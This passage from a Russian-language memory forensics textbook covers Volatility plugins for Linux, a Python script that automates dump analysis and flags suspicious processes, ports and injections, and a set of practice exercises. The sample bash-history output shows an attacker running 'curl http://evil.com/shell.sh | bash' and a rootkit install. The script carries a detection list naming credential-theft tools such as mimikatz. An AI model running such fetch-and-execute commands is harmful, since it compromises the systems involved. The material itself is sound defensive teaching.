python3 vol.py -f memory.raw windows.dumpfiles \
    --virtaddr 0x<address_from_filescan> \
    --dump-dir /tmp/
```

---

## 10.4.9 Анализ Linux-памяти

```bash
# Базовые плагины для Linux:
python3 vol.py -f linux_memory.lime linux.bash        # История bash
python3 vol.py -f linux_memory.lime linux.pslist      # Список процессов
python3 vol.py -f linux_memory.lime linux.pstree      # Дерево процессов
python3 vol.py -f linux_memory.lime linux.netstat     # Сетевые соединения
python3 vol.py -f linux_memory.lime linux.lsof        # Открытые файлы
python3 vol.py -f linux_memory.lime linux.check_modules  # Проверка LKM

# История bash из памяти:
python3 vol.py -f linux_memory.lime linux.bash

# Вывод:
# PID    Process   CommandTime                  Command
# 1234   bash      2024-01-15 10:15:23          whoami
# 1234   bash      2024-01-15 10:15:30          id
# 1234   bash      2024-01-15 10:15:45          curl http://evil.com/shell.sh | bash
# 1234   bash      2024-01-15 10:16:01          ./rootkit install

# Обнаружение скрытых LKM руткитов:
python3 vol.py -f linux_memory.lime linux.check_modules

# Сравнение /proc/modules и сканирование ядра:
python3 vol.py -f linux_memory.lime linux.lsmod        # Из /proc/modules
python3 vol.py -f linux_memory.lime linux.check_modules # Через сканирование
# Разница = скрытые LKM-руткиты
```

---

## 10.4.10 Автоматизация анализа

### Скрипт полного анализа

```python
#!/usr/bin/env python3
"""
Автоматизированный анализ дампа памяти
Создаёт HTML-отчёт с результатами
"""

import subprocess
import json
import os
import hashlib
import datetime
from pathlib import Path
from typing import Dict, List, Tuple

class MemoryAnalyzer:
    """Автоматизированный анализатор дампов памяти"""
    
    SUSPICIOUS_PATHS = [
        r'C:\Users', r'C:\Temp', r'C:\Windows\Temp',
        r'AppData\Local\Temp', r'AppData\Roaming'
    ]
    
    SUSPICIOUS_PROCESSES = [
        'mimikatz', 'procdump', 'wce', 'pwdump',
        'fgdump', 'gsecdump', 'meterpreter'
    ]
    
    def __init__(self, memory_file: str, output_dir: str):
        self.memory_file = memory_file
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.vol = "python3 /opt/volatility3/vol.py"
        self.findings = []
        self.report = {
            'timestamp': datetime.datetime.now().isoformat(),
            'memory_file': memory_file,
            'sha256': self._hash_file(memory_file),
            'findings': [],
            'processes': [],
            'network': [],
            'injections': []
        }
    
    def _hash_file(self, filepath: str) -> str:
        """SHA256 хэш файла"""
        sha256 = hashlib.sha256()
        with open(filepath, 'rb') as f:
            for chunk in iter(lambda: f.read(8192), b''):
                sha256.update(chunk)
        return sha256.hexdigest()
    
    def _run_plugin(self, plugin: str, args: str = "") -> str:
        """Запуск Volatility плагина"""
        cmd = f"{self.vol} -f {self.memory_file} {plugin} {args}"
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, 
                text=True, timeout=300
            )
            return result.stdout
        except subprocess.TimeoutExpired:
            return f"TIMEOUT: {plugin}"
        except Exception as e:
            return f"ERROR: {e}"
    
    def analyze_processes(self) -> List[Dict]:
        """Анализ процессов"""
        print("[*] Анализ процессов...")
        
        pslist_output = self._run_plugin("windows.pslist")
        psscan_output = self._run_plugin("windows.psscan")
        cmdline_output = self._run_plugin("windows.cmdline")
        
        # Сохранение сырых данных
        (self.output_dir / "pslist.txt").write_text(pslist_output)
        (self.output_dir / "psscan.txt").write_text(psscan_output)
        (self.output_dir / "cmdline.txt").write_text(cmdline_output)
        
        # Разбор результатов
        processes = []
        for line in pslist_output.split('\n')[2:]:
            parts = line.split()
            if len(parts) >= 7:
                proc = {
                    'pid': parts[0],
                    'ppid': parts[1],
                    'name': parts[2],
                    'offset': parts[3],
                    'suspicious': False,
                    'reasons': []
                }
                
                # Проверка на подозрительность
                name_lower = parts[2].lower()
                for sus_proc in self.SUSPICIOUS_PROCESSES:
                    if sus_proc in name_lower:
                        proc['suspicious'] = True
                        proc['reasons'].append(f"Имя процесса содержит: {sus_proc}")
                
                processes.append(proc)
        
        self.report['processes'] = processes
        return processes
    
    def analyze_network(self) -> List[Dict]:
        """Анализ сетевых соединений"""
        print("[*] Анализ сетевых соединений...")
        
        netscan_output = self._run_plugin("windows.netscan")
        (self.output_dir / "netscan.txt").write_text(netscan_output)
        
        connections = []
        for line in netscan_output.split('\n')[2:]:
            parts = line.split()
            if len(parts) >= 9 and parts[4] == 'ESTABLISHED':
                conn = {
                    'local_addr': parts[2],
                    'local_port': parts[3],
                    'foreign_addr': parts[5],
                    'foreign_port': parts[6],
                    'state': parts[7],
                    'pid': parts[8],
                    'process': parts[9] if len(parts) > 9 else 'unknown',
                    'suspicious': False,
                    'reasons': []
                }
                
                # Проверка нестандартных портов
                port = int(parts[6]) if parts[6].isdigit() else 0
                if port not in [80, 443, 53, 8080, 8443, 22, 3389]:
                    conn['suspicious'] = True
                    conn['reasons'].append(f"Нестандартный порт: {port}")
                
                connections.append(conn)
        
        self.report['network'] = connections
        return connections
    
    def analyze_injections(self) -> List[Dict]:
        """Поиск инъекций кода"""
        print("[*] Поиск инъекций кода...")
        
        malfind_dir = self.output_dir / "malfind"
        malfind_dir.mkdir(exist_ok=True)
        
        malfind_output = self._run_plugin(
            "windows.malfind", 
            f"--dump --dump-dir {malfind_dir}"
        )
        (self.output_dir / "malfind.txt").write_text(malfind_output)
        
        injections = []
        for dmp_file in malfind_dir.glob("*.dmp"):
            with open(dmp_file, 'rb') as f:
                data = f.read(4)
            
            if data[:2] == b'MZ':
                inj = {
                    'file': str(dmp_file),
                    'sha256': self._hash_file(str(dmp_file)),
                    'has_pe_header': True,
                    'size': dmp_file.stat().st_size
                }
                injections.append(inj)
                
                self.findings.append({
                    'severity': 'HIGH',
                    'description': f"PE-файл в инжектированном регионе: {dmp_file.name}",
                    'artifact': str(dmp_file)
                })
        
        self.report['injections'] = injections
        return injections
    
    def generate_report(self) -> str:
        """Генерация JSON-отчёта"""
        self.report['findings'] = self.findings
        
        report_path = self.output_dir / "analysis_report.json"
        report_path.write_text(
            json.dumps(self.report, indent=2, ensure_ascii=False)
        )
        
        print(f"\n[+] Анализ завершён. Отчёт: {report_path}")
        print(f"[*] Найдено признаков: {len(self.findings)}")
        
        for finding in self.findings:
            print(f"  [{finding['severity']}] {finding['description']}")
        
        return str(report_path)
    
    def run_full_analysis(self):
        """Запуск полного анализа"""
        print(f"[*] Начало анализа: {self.memory_file}")
        print(f"[*] SHA256: {self.report['sha256']}")
        
        self.analyze_processes()
        self.analyze_network()
        self.analyze_injections()
        
        return self.generate_report()


if __name__ == '__main__':
    import sys
    
    if len(sys.argv) != 3:
        print(f"Использование: {sys.argv[0]} <memory_dump> <output_dir>")
        sys.exit(1)
    
    analyzer = MemoryAnalyzer(sys.argv[1], sys.argv[2])
    analyzer.run_full_analysis()
```

---

## Итоги главы

В этой главе мы изучили форензику оперативной памяти с использованием фреймворка Volatility. Ключевые выводы:

1. **Анализ памяти** позволяет обнаружить fileless malware, инъекции кода и артефакты, невидимые на диске
2. **Volatility 3** — современный инструмент с автоматической загрузкой символов; Volatility 2 — для старых систем
3. **Ключевые плагины**: `pslist/psscan` (сравнение для DKOM), `netscan` (соединения), `malfind` (инъекции), `cmdline` (командные строки)
4. **Техники инъекций**: Process Hollowing, DLL Injection, Reflective DLL — все имеют характерные признаки в памяти
5. **Автоматизация**: скрипты ускоряют анализ и снижают риск пропустить важные артефакты
6. **Хранение доказательств**: всегда верифицируйте SHA256 и сохраняйте оригинал неизменным

> **Важно:** Форензика памяти — это искусство, требующее понимания внутренней структуры ОС. Изучите структуры данных Windows (EPROCESS, VAD, PEB) для эффективного анализа.

---

## Практические задания

### Задание 1: Анализ тестового дампа
Скачайте тестовый дамп с Volatility Foundation или MemLabs (GitHub):
```bash
# Получение тестового дампа MemLabs:
wget https://github.com/stuxnet999/MemLabs/raw/master/Lab1/MemLabs-Lab1.7z
7z x MemLabs-Lab1.7z
```
Проведите полный анализ: процессы, сеть, инъекции.

### Задание 2: CTF-задача по форензике памяти
Решите задачу из MemLabs Lab1-Lab6, задокументировав каждый шаг анализа.

### Задание 3: Создание собственного дампа
На тестовой VM Windows:
1. Запустите подозрительную программу (calc.exe с инъекцией через учебные примеры)
2. Создайте дамп памяти через WinPMem
3. Проверьте, обнаруживает ли Volatility malfind инъекцию

### Zadanie 4: Автоматизация через Python
Модифицируйте скрипт `MemoryAnalyzer` для:
- Экспорта HTML-отчёта вместо JSON
- Интеграции с VirusTotal API для проверки хэшей
- Отправки уведомлений в Slack при обнаружении критических артефактов

### Задание 5: Сравнительный анализ
Проведите анализ одного дампа в Volatility 2 и Volatility 3:
- Сравните скорость работы плагинов
- Задокументируйте различия в выводе
- Выявите функции, доступные только в одной версии
